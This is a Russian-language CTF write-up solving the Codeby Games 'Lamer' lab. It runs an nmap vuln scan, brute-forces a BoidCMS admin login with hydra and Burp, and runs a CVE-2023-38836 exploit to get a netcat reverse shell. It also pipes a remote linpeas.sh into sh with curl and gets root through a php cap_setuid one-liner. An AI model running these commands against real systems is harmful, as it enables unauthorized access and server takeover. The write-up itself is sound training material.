# Codeby Games - Квесты - "Ламер"
Уровень: Легкий

![[Pasted image 20240705193303.png]]

# **Разведка**

Сканируем на уязвимости....
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV --script vuln -p 28995 62.173.140.174
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04
Nmap scan report for codeby.games (62.173.140.174)
Host is up (0.066s latency).

PORT      STATE SERVICE VERSION
28995/tcp open  http    Apache httpd
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /bak/: Possible backup
```

Эта команда запускает приложение Nmap (Network Mapper) с флагами `-sV` и `--script vuln` и указанным IP-адресом (62.173.140.174) и портом (28995).

Флаг `-sV` говорит Nmap запускать версионное сканирование указанного хоста и порта, то есть определять используемую на этом порте службу и ее версию.

Флаг `--script vuln` говорит Nmap запускать скрипты из каталога `/usr/share/nmap/scripts/` (по умолчанию), которые ищут уязвимости в указанной службе.

Таким образом, эта команда попытается определить версию службы на порту 28995 указанного IP-адреса и запустит все найденные скрипты, которые могут обнаружить уязвимости в этой службе. Результаты будут выведены в консоль.

---

Находим путь `http://62.173.140.174:28995/bak/`
Увидим страницу.
![[Pasted image 20240705193930.png]]

1. Видим название CMS.
Поискав в интернете можно найти exploit.
```
BoidCMS
|http://62.173.140.174:28995/bak/admin
|_ https://github.com/1337kid/CVE-2023-38836
```

2. Видим админскую панель.
Так как мы нашли эксплойт, но для его использования требуется аккаунт, будем брутить.
```bash
hydra -l admin -P rockyou.txt 62.173.140.174 -s 28995 http-post-form "/bak/admin:username=^USER^&password=^PASS^:Incorrect username or password, please try again."
```

Эта команда относится к инструменту тестирования проникновения под названием Hydra. Hydra используется для brute-force атак на аутентификационные данные, такие как логины и пароли, для различных служб.

Здесь краткое объяснение команды:
- `hydra`: Это команда для запуска инструмента Hydra.
- `-l admin`: Эта опция указывает имя пользователя для использования в атаке brute-force. В данном случае именем пользователя является `admin`.
- `-P rockyou.txt`: Эта опция указывает путь к файлу, содержащему список паролей для проб и ошибок во время атаки. В данном случае файл называется `rockyou.txt`.
- `62.173.140.174`: Это IP-адрес целевой системы, на которую будет производиться атака Hydra.
- `-s 28995`: Эта опция указывает номер порта для использования в атаке. В данном случае используется номер порта `28995`.
- `http-post-form`: Эта опция указывает протокол и метод для использования в атаке. В данном случае Hydra будет использовать протокол HTTP и метод POST.
- `"/bak/admin:username=^USER^&password=^PASS^:Неверное имя пользователя или пароль, пожалуйста, попробуйте еще раз."`: Это форма, которую Hydra будет отправлять на целевую систему во время атаки. Она включает путь к URL, поля имени пользователя и пароля и сообщение об ошибке, которое возвращает целевая система, когда указанныеcredentials неверны.

Вкратце, эта команда будет использовать Hydra для brute-force атаки на пароль пользователя `admin` на целевой системе, расположенной по адресу `62.173.140.174`, используя порт `28995` и список паролей `rockyou.txt`. Атака будет использовать метод HTTP POST и отправлять поля имени пользователя и пароля с помощью указанной формы.

У меня не получилось сбрутить. Почему-то Hydra определяет несколько паролей как верные... (возможно, я сделал ошибку!)

Я решил использовать BurpSuite для проведения атаки методом перебора (brute-force). В качестве словаря я использовал файл `rockyou.txt`. 

Как я уже понял, эта атака была успешной! 
Логин: `admin` Пароль: `password`
P.S. Да, это именно те учетные данные, которые отображены на скриншоте далее.

---

# Атака

3. Использование exploit есть на скришоте. 
![[img-23523434234234.png]]

Я использовал для выкидывание своего ip в сеть сервис playit.gg соединение TCP.

Выполняем команды:
1.
```bash
┌──(kali㉿kali)-[~/…/CTF/codeby/Lamer/CVE-2023-38836]
└─$ nc -lvnp ваш_порт

```
Эта команда запускает утилиту `nc` (сокращение от `netcat`) в режиме прослушивания (`-l`) на указанном порту (`ваш_порт`). Опция `-v` включает подробный вывод, а `-n` отключает разрешение доменных имен, что ускоряет работу утилиты. Опция `-p` указывает порт, на котором будет прослушиваться соединение.

После запуска этой команды утилита `nc` будет прослушивать соединения на указанном порту и ожидать входящего трафика. Когда трафик будет обнаружен, утилита `nc` напечатает сообщение об этом в терминале и позволит пользователю взаимодействовать с входящим трафиком в реальном времени.

2.
```bash
┌──(kali㉿kali)-[~/…/CTF/codeby/Lamer/CVE-2023-38836]
└─$ python3 CVE-2023-38836.py -u http://62.173.140.174:28995/bak -U admin -P password -l IP-playit.gg -p PORT-playit.gg
```

После запуска эксплойта мы проверяем соединение в nc и видим, что мы внутри машинки!

---
# Повышение прав

Побегая по системе, мы можем найти пользователя с именем "lammer". Запомним это, так как это может пригодиться в дальнейшем.

После того, как мы получили первичный доступ, используем стандартную команду `sudo -l`, чтобы узнать какие команды от лица `www-data мы` можем запускать без пароля с правами суперпользователя
**Увы, доступа нету!**

Теперь я решил, что нужно пытаться найти способы повысить свои привилегии. Давайте скачаем и запустим скрипт `linpeas.sh`

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
<g/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

После выполнение выполнение команды можем увидеть:
![[linPEAS-0912939012309.png]]
```bash
Files with capabilities (limited to 50):
/usr/bin/php8.1 cap_setuid=ep
```

Пытаемся найти, что-то по поиску:
1. sudo php8.1 lpe или же sudo php8.1 local root exploit

![[Pasted image 20240705210638.png]]
(скриншот как пример)

2. hacktricks /usr/bin/php8.1 cap_setuid=ep
нашел: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_setuid

Двигаясь в правильном направлении, но все равно не то.
Пытаемся еще погуглить:
- /usr/bin/php8.1 cap_setuid=ep  local root exploit

Находим: https://gtfobins.github.io/gtfobins/php/

![[gtfobins-php0329429340923409.png]]

На скриншоте можем увидеть способ повысить права.
```bash
cp $(which php) .
sudo setcap cap_setuid+ep php

CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"
```

Выполняем команды и ничего не получаем ;)
Вспомните, что у нас php8.1 и выполнять нужно команду там, где находится php8.1.

Выполняем в `/usr/bin/` команду:
```bash
CMD="/bin/sh"
./php8.1 -r "posix_setuid(0); system('$CMD');"
```

Если команда не сработала, попробуйте нажать Enter и повторить команду. Затем проверьте вывод команды `whoami`.

![[Pasted image 20240705211146.png]]
Теперь мы под `root`, поздравляю!
# Флаг 1
1. Введите команду `cd /home`.
2. Затем найдите пользователя `lammer`.
3. Выполните команду `cat first_part`.
Забираем первую часть!

# Флаг 2
1. Перейдите в `root`.
2. Выполните команду `cat last_part`.
3. Получите вторую часть флага.

**Поздравляю! Мы решили таску!**
# КОНЕЦ!
